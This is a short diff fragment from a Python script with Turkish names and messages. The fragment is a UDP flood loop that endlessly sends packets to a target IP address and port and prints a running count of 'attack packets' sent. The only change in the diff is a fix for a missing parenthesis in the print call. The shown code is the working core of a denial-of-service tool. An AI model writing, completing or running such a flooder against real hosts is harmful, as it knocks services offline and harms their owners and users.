@@ -19,4 +19,4 @@ sayac=0
 while True:
     sock.sendto(bytes,(hedef_ip,hedef_port))
     sayac=sayac+1
-    print(Fore.GREEN  + "saldiri baslatildi, gonderilen saldırı paketi:%s"%(sayac)
+    print(Fore.GREEN  + "saldiri baslatildi, gonderilen saldırı paketi:%s"%(sayac))
